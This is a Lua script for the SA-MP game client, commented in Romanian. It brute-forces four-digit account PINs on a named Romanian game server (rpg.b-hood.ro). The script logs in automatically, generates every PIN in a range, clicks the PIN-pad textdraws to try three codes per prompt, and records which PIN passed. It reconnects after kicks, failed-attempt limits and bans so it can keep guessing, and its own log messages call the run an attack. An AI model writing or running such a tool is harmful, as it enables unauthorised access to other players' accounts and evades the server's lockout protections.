local ev = require 'samp.events'

counter = 0
pin = ""
passed_pin = ""
passed_date = ""

passed_value = 0
invalid_value = 0
delay = 0

-- Log
function log(color, text)
	sampAddChatMessage(color .. "{ff0000}Bot:{ffffff} " .. text)
	print(color.. "Bot: {ffffff}" .. text) 
end


-- Auto-Login
function dialog()
	wait(100)
	sampSendDialogResponse(2, 1, 65535, password)
	wait(100)
	sampCloseCurrentDialogWithButton(1)
	wait(100)
end

-- Genereaza pin-urile de la 0000 la 9999
function generate_pins()
	for x = input1.v, input2.v, 1 do
		if string.len(tostring(x)) == 1 then 
			num = "000" .. tostring(x)
			table.insert(listbox_array, num)
		end
		if string.len(tostring(x)) == 2 then
			num = "00" .. tostring(x)
			table.insert(listbox_array, num)
		end
		if string.len(tostring(x)) == 3 then 
			num = "0" .. tostring(x)
			table.insert(listbox_array, num)
		end
		if string.len(tostring(x)) == 4 then 
			table.insert(listbox_array, tostring(x))
		end
	end
end

-- Curata array-ul listbix-ului
function clean_array()
	for x = 0, 10000, 1 do
		listbox_array[x] = nil
	end
end

-- Apeleaza textdraw-urile
function call_td(id)
	if id == 0 then 
		sampSendClickTextdraw(2147)
	end
	if id == 1 then 
		sampSendClickTextdraw(2138)
	end
	if id == 2 then 
		sampSendClickTextdraw(2139)
	end
	if id == 3 then 
		sampSendClickTextdraw(2140)
	end
	if id == 4 then 
		sampSendClickTextdraw(2141)
	end
	if id == 5 then 
		sampSendClickTextdraw(2142)
	end
	if id == 6 then 
		sampSendClickTextdraw(2143)
	end
	if id == 7 then 
		sampSendClickTextdraw(2144)
	end
	if id == 8 then 
		sampSendClickTextdraw(2145)
	end
	if id == 9 then
		sampSendClickTextdraw(2146)
	end
end

function call_td_all(num1, num2, num3, num4)
	log("{ffff00}", string.format("Sended-Texdraw with id: [%d%d%d%d]", num1, num2, num3, num4))
	pin = string.format("%d%d%d%d", num1, num2, num3, num4)
	wait(delay)
	call_td(tonumber(num1))
	wait(delay)
	call_td(tonumber(num2))
	wait(delay)
	call_td(tonumber(num3))
	wait(delay)
	call_td(tonumber(num4))
	wait(delay)
	sampSendClickTextdraw(119) -- verify textdraw
	wait(delay)
end

function convert_string(number1, number2, number3)
	
	buffer = {}
	buffer[1] = number1
	buffer[2] = number2
	buffer[3] = number3

	for x=1 ,3 ,1 do
		if buffer[x] ~= nil then
			number = tostring(buffer[x])
			n1 = string.sub(number, 1, 1)
			n2 = string.sub(number, 2, 2)
			n3 = string.sub(number, 3, 3)
			n4 = string.sub(number, 4, 4)
			call_td_all(n1, n2, n3, n4)
		end
	end
end

-- hook dialog
function ev.onShowDialog(dialog_id, style, title, button1, button2, text)
	if activated == 1 then 
		if (dialog_id == 2) and (string.match(text, "Please enter your password")) then 
			log("{00ff00}", "Dialog Box-ul a fost detectat")
			dialog_passed = 1
			lua_thread.create(function()
				dialog()
			end)
		end
	end 
end

-- hook server_message
function ev.onServerMessage(color, text)
	if activated == 1 then
		if color == -569109249 then
			if string.match(text, "Parola incorecta!") then
				activated = 0 
				sampConnectToServer("rpg.b-hood.ro", 7777)
				log("{b30000}","Wrong account password, attack dezactivated")
			end
		end
		if color == -569109249 then
			if string.match(text, "Ai primit kick deoarece") then 
				log("{ff0000}", "3 fail-uri detected")
				sampConnectToServer("rpg.b-hood.ro", 7777)
			end
		end

		if color == -569109249 then 
			if string.match(text, "Codul PIN introdus de tine nu este valid") then 
				log("{b30000}", "Invalid pin: [" .. pin .. "]")
			end
		end

		if color == -65281 then
			if string.match(text, "Codul PIN introdus de tine este unul valid") then 
				log("{00ff00}", "Passed pin: [" .. pin .. "]")
				activated = 0
				passed_date = os.date("%c")
				passed_pin = pin
			end
		end

		if string.match(text, "Probleme cu conexiunea") then 
			Log("{0099ff}", "Server-ul are probleme cu baza de date")
			sampConnectToServer("rpg.b-hood.ro", 7777)
		end
	end
end


start = 1
local local_array = {}


-- hook server close connection
function ev.onConnectionClosed()
	if activated == 1 then 
		log("{0099ff}", "Conexiunea a fost blocata de catre server")
		sampConnectToServer("rpg.b-hood.ro", 7777)
	end
end


function ev.onConnectionBanned()
	if activated == 1 then
		lua_thread.create(function()
			wait(5000)
			log("{0099ff}", "Conexiunea a fost banata  de catre server, reancerc...")
			sampConnectToServer("rpg.b-hood.ro", 7777)
		end)
	end
end

-- hook text_draw
function ev.onShowTextDraw(textdraw_id)
	if activated == 1 then
		if textdraw_id == 119 then -- 119
			log("{00ff00}", "Textdraw-ul de PIN a fost detectat")
			if start == 1 then
				for x = start, 3, 1 do
					local_array[x] = listbox_array[x]
				end
				lua_thread.create(function()
					wait(500)
					convert_string(local_array[1], local_array[2], local_array[3])
				end)
				start = 3
			else
				for x = 1, 3, 1 do
					start = start + 1
					local_array[x] = listbox_array[start]
				end
				lua_thread.create(function()
					wait(500)
					convert_string(local_array[1], local_array[2], local_array[3])
				end)
			end
		end
	end
end
